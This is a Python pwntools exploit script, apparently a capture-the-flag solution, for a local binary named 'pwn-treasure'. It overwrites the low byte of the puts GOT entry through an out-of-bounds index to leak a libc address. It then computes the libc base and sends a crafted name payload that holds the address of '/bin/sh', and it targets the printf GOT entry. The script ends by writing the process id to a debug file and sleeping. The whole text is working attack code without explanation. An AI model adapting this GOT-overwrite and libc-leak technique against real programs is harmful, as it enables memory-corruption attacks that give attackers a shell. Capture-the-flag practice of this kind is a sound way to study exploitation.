from pwn import *


context(arch='amd64', os='linux', log_level='error')

elf = ELF('./pwn-treasure', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

bss = 0x40a0
pid_file = './debug_pid.txt'


def idx(addr):
    return (addr - bss) // 8


def build_name_payload(libc_base):
    return flat(
        {
            0x18: 0,
            0x20: 0,
            0x40: libc_base + next(libc.search(b'/bin/sh\x00')),
            0x48: 0,
        },
        filler=b'A',
        length=0x50,
    )


io = process('./pwn-treasure')
puts_lsb = libc.sym['puts'] & 0xff

io.sendlineafter(b'password: ', b'0')
io.sendlineafter(b'Which one?\n', str(idx(elf.got['puts'])).encode())
io.send(p8(puts_lsb))
io.recvuntil(b'after your operation, the context: ')
puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
io.recvuntil(b'you should tell me your name.\n')

libc_base = puts_addr - libc.sym['puts']
payload = build_name_payload(libc_base)
io.send(payload + b'\n')
io.sendlineafter(b'Last time!Lucky, guy!\n', str(idx(elf.got['printf'])).encode())

with open(pid_file, 'w') as f:
    f.write(str(io.pid))

sleep(90)
